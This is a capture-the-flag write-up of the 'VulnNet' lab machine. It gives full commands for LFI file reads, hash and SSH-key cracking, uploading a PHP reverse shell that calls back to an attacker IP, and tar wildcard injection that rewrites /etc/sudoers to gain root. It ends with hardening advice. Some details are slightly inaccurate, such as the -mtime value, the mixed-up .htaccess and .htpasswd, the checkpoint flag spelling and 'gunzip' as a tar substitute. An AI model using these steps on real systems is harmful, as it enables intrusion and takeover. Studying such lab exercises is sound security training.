## [0x01] Outline

![Subscribe](/assets/img/vulnnet/vulnnet_icon.png){: w="100" .left}

VulnNet has a Medium difficulty rating running `PHP` as its web language. The brief states that it takes a more realistic approach to infiltrating the system.

Our first step is to enumerate the subdomains and collect a username and password using `LFI`.
Then, using an unauthenticated file upload vulnerability, we upload our reverse shell, and finally, all privilege escalation is accomplished through the use of a backup script and `tar` abuse.



## [0x02] Recon

Our scope document says we should add `vulnnet.thm` to our hosts file.

```bash
sudo echo '10.10.94.236 vulnnet.thm' >> /etc/hosts
```

Running nmap we find 2 ports open. Banners are reporting `Ubuntu` and an Apache web server.

### nmap

```bash
nmap -sC -sV -oA nmap/vulnnet -v -p- -Pn vulnnet.thm

# Nmap 7.92 scan initiated Mon Feb 28 09:48:27 2022 as: nmap -sC -sV -oA nmap/vulnnet -v -p- -Pn vulnnet.thm

```

Knowing that we have a web server, the next thing we'll do is run two `gobuster` scans one to find additional subdomains and the other to enumerate content.
>It's always good practice to have automatic `Recon` going while you're working. It will save you a lot of time when you need other avenues to explore.
{: .prompt-tip }

### gobuster

```bash
gobuster vhost -u http://vulnnet.thm -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -o vulnnet-vhost.gobuster
```

```bash
gobuster dir -u http://vulnnet.thm -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt -o vulnnet-dir.gobuster
```

### Walking the website

While our `gobuster` is scanning we can take a look at the website.  The first page has a subscribe form, checking the developer tools in Firefox we can see that there is no `POST` request and the button takes you back to the main page.

![Subscribe](/assets/img/vulnnet/01.png){: width="700" height="400" }

Watching the network tab on the dev tools we can see that there are two `js` files being loaded, `index__7ed54732.js` and `index__d8338055.js`, we'll take note of these and continue walking the site.

Clicking the sign in button takes you to a login form.  Brute forcing isn't a option as we have no usernames or passwords to try.  `Sign Up` and `Forgot Password` are just Anchor Tags and don't go anywhere.

![Sigin](/assets/img/vulnnet/02.png){: w="300" }

After spending a few minutes with `BurpSuite` trying various `SQLI` attacks we're not getting any error messages or indication that `SQLI` is possible.  There isn't anything else to try on the website so we need to find other endpoints to probe.

Now we move on to the js files.  We can save them down with `curl -O` and run them through a `bash` port of [tomnomnom's](https://twitter.com/TomNomNom) go tool [gf](https://github.com/tomnomnom/gf) that I coded last week which I called `pursue`.

```bash
mkdir src
cd src
curl -O http://vulnnet.thm/js/index__7ed54732.js
curl -O http://vulnnet.thm/js/index__d8338055.js

pursue --domains | sort -u
broadcast.vulnnet.thm
vulnnet.thm
```

Searching for domains in these two js files we find `vulnnet.thm` which is the page we are on and a new subdomain called `broadcast.vulnnet.thm`.

>gobuster will find this address using 'subdomains-top1million-5000.txt'
{: .prompt-info }

### broadcast.vulnnet.thm

Adding broadcast.vulnnet.thm address to `/etc/hosts` and checking the website we're prompted for a username and password.

We'll set `gobuster` to run again on `broadcast.vulnnet.thm` and see if there are any pages that does not require authentication. We'll have to set `-b 401` to ignore `401 Unauthorized` status codes.

```bash
gobuster dir -u http://broadcast.vulnnet.thm -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt -o broadcast.dirs -b 401
```

Now we're stuck since we've exhausted `vulnnet.thm`. Our directory scan didn't find anything and we waiting on our `gobuster` scan of `broadcast.vulnnet.thm`. We can go back and take a deeper look at the js files.


## [0x03] Local File Inclusion

Running `pursue` on our js files shows that `index__d8338055.js` has a call with a `referer` param.

```bash
pursue --query
./index__d8338055.js:http://vulnnet.thm/index.php?referer=
```

The code is heavily compacted and I honestly have no idea how to read it but clearly it must be calling `http://vulnnet.thm/index.php` and setting `referer=` to something.  Let's take a closer look in `BurpSuite`.

```js
---snip---
, n.n = function (e) {var t = e && e.__esModule ? function () { return e.default } : function () { return e }; return n.d(t, "a", t), t}, n.o = function (e, t) { return Object.prototype.hasOwnProperty.call(e, t) }, 
        n.p = "http://vulnnet.thm/index.php?referer=", n(n.s = 0)}({
---snip---
```

### referer=

When clicking on the subscribe button we can see that there is a new Header `Referer: http://vulnnet.thm/?`. So this js file and function is setting `referer` to the current page we are currently on.

>When you see query parameters in urls, try LFI Local File Inclusion.
{: .prompt-tip }

Loading the page and sending the request to the `repeater` tab of Burp allows us to try many types of paths for our `LFI`.

```yaml
GET /index.php?referer=/etc/passwd HTTP/1.1
Host: vulnnet.thm
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
```

Trying `/etc/passwd` and searching the responce for `root:` we get one match, meaning we read out the contents of `/etc/passwd` and we now have a list of all the users on this system.



```html
root:x:0:0:root:/root:/bin/bash
---snip---
server-management:x:1000:1000:server-management,,,:/home/server-management:/bin/bash
mysql:x:112:123:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
```

### apache config

Now we can read out files that belong to the web server we should be able to find the apache config files.
From our nmap banners we know this system is running `Apache httpd 2.4.29` on `Ubuntu`.  Searching the web for this information we'll find that the default config location is `/etc/apache2/apache2.conf` and `/etc/apache2/sites-available/000-default.conf`

Checking `/etc/apache2/sites-available/000-default.conf` and finding the section for `broadcast.vulnnet.thm` we can see the path for `AuthUserFile` is `/etc/apache2/.htpasswd`.  This file should have a username and password.

```conf
---snip---
<VirtualHost *:80>
	ServerAdmin webmaster@localhost
	ServerName broadcast.vulnnet.thm
	DocumentRoot /var/www/html
	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined
	<Directory /var/www/html>
		Order allow,deny
		allow from all
		AuthType Basic
		AuthName "Restricted Content"
		AuthUserFile /etc/apache2/.htpasswd
		Require valid-user
	</Directory>
</VirtualHost>
---snip---
```

Loading the `.htaccess` file we can see the username and password required for logging in.
Trying this as the username and password doesn't work. A string starting with `$apr1$` is going to be a hash of the password. `hashcat` should be able crack this.

```bash
developers:$apr1$[REDACTED]
```

Checking the example list of hashes from `hashcat` we can see this is `1600 | Apache $apr1$ MD5, md5apr1, MD5 (APR)`.  Given enough time the password is eventually cracked and we're able to log into `broadcast.vulnnet.thm`.

```bash
hashcat '$apr1$[REDACTED]' /usr/share/wordlists/rockyou.txt -m 1600
---snip---
$apr1$[REDACTED]:[REDACTED]
```

### Password Spraying

Now we have a username and password we should try them on every possible service.

|Service|Success|
---|---|
SSH|No
vulnnet.thm|No
broadcast.vulnnet.thm|Yes


## [0x04] Clipbucket

After logging in we see that we're now on some sort of media sharing site.  I'm immediately thing file upload for reverse shell.

![Clipbucket](/assets/img/vulnnet/03.png){: w="700" }

Trying the password on the `Login` button doesn't work.  Now it's time to run our recon with `gobuster` in dir mode.
After spending a few minutes trying to `sign up` we are unable to get passed a error.  Given this is blocked behind developer credentials we'll assume the site is not fully functional.

Reviewing our `gobuster` scan and filtering out the status codes of `403 Forbidden` we can see a files directory.

```bash
gobuster dir -u http://broadcast.vulnnet.thm -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt -U developers -P [REDACTED] -o broadcast.dirs

grep -v 403 broadcast.dirs

```

### File Upload

With no way to `sign up` and our `LFI` only able to read files, we'll need a vulnerability for this site.  Checking the pages source code we find `ClipBucket version 4.0`. Searching [exploit-db](https://www.exploit-db.com/) we find `ClipBucket < 4.0.0 - Release 4902 - Command Injection / File Upload / SQL Injection`.

### Setup

We need a reverse shell to upload and since this is PHP server so we'll copy `/usr/share/seclists/Web-Shells/laudanum-0.8/php/php-reverse-shell.php` to out current working directory as `rev.php` and edit the variables to match our `IP` and the `port` we want to use.

```php
---snip---
set_time_limit (0);
$VERSION = "1.0";
$ip = '10.8.208.76';  // CHANGE THIS LOCAL IP TO CONNECT BACK TO
$port = 4242;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
---snip---
```

We'll run `netcat` to catch our reverse shell and then run the exploit using `curl`.

```bash
curl -F "file=@rev.php" -F "plupload=1" -F "name=rev.php" http://broadcast.vulnnet.thm/actions/photo_uploader.php -u developers:[REDACTED]
{"success":"yes","file_name":"1622174479d86fa0","extension":"php","file_directory":"2022\/02\/28"}
```

```bash
nc -lvnp 4242
```

Once we see the file is uploaded we can navigate to `http://broadcast.vulnnet.thm/files/photos/2022/02/28/1622174479d86fa0.php` and load the file.  If everything was successful we'll have a shell waiting.


```bash
whoami
www-data
```

## [0x05] Privilege Escalation

For quality of life work we'll need a stable shell.

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm-256color
{CTRL+Z}
stty raw -echo;fg
{ENTER}
```
>{CTRL+Z} and {ENTER} are pressed keyboard keys
{: .prompt-info }

### Finding Backup Files

Running `sudo -l` we're prompted for the password.  Next we'll try to find any interesting backup files written in the last 7 days.


```bash
find / -type f \( -iname "*.bak" -o -iname "*.tar.gz" \) -mtime -10080 -exec ls -ldb --color {} \; 2>/dev/null
---snip---
-rw-r--r-- 1 root root 16643 Feb 23  2018 /usr/share/usb_modeswitch/configPack.tar.gz
-rw------- 1 root shadow 1118 Jan 23  2021 /var/backups/shadow.bak
-rw-rw-r-- 1 server-management server-management 1484 Jan 24  2021 /var/backups/ssh-backup.tar.gz
-rw------- 1 root root 1831 Jan 23  2021 /var/backups/passwd.bak
-rw------- 1 root shadow 712 Jan 23  2021 /var/backups/gshadow.bak
-rw------- 1 root root 857 Jan 23  2021 /var/backups/group.bak
---snip---
```

Copying `/var/backups/ssh-backup.tar.gz` to `/dev/shm/` and unpacking reveals an `id_rsa` ssh key.

```bash
tar -xzf /dev/shm/ssh-backup.tar.gz
```
Copying over the `id_rsa` to our machine and attempting to use it to ssh requires a password.  We can use `ssh2john` and then `john` to crack this password.

### Cracking SSH Keys

```bash
python2.7 /usr/share/john/ssh2john.py id_rsa > id_rsa.hash
```
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash

Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
---snip---
[REDACTED]     (id_rsa)
---snip---
```

Now we have the password and the file was owned by `server-management` lets try ssh into the machine.


```bash
ssh server-management@vulnnet.thm -i id_rsa
Enter passphrase for key "id_rsa":
ls
user.txt
cat user.txt
THM[REDACTED]
```

## [0x06] Privilege Escalation to Root

Taking a look at the key parts of the backup script we can see that it will run `tar *` in `/home/server-management/Documents`. There is a neat trick with `tar` on [gtfobins](https://gtfobins.github.io/gtfobins/tar/).


```bash
---snip---
cd /home/server-management/Documents
backup_files="*"
---snip---
# Backup the files using tar.
tar czf $dest/$archive_file $backup_files
---snip---
```

Here we will create a script that when run as `root` it will over write the `/etc/sudoers` file with `server-management ALL=(root) NOPASSWD: ALL` allowing `server-management` to run any command as the `root` user.

```bash
cd ~/Documents
echo 'echo "server-management ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > exploit.sh
echo "" > " - checkpoint-action=exec=sh exploit.sh"
echo "" > - checkpoint=1
```

After a short pause we can run

```bash
sudo cat /root/root.txt
THM[REDACTED]
```

## [0x07] Server Hardening

This this section we will make recommendations on how to harden the server and mitigate these vulnerabilities.

### ClipBucket
`ClipBucket` should be upgraded to version `4.1` from `4.0` as patch notes mention that the vulnerabilities used in our attack have been patched.

### Passwords
Passwords used for both the `developers` and `server-management` accounts should be increased in length and complexity.  Using a password manager that is able to check against known passwords lists should also be considered.

### LFI
This section of the code found in the `index.html` should be removed as it doesn't provide any functionality.

```php
<?php
$file = $_GET['referer'];
$filter = str_replace('../','',$file);
include($filter);
?>
```

### Backup
`tar` should not be used to backup files using the `*` on the GNU version. Moving to another program such as `gunzip` is recommended as no know `privsec` is known at this time.
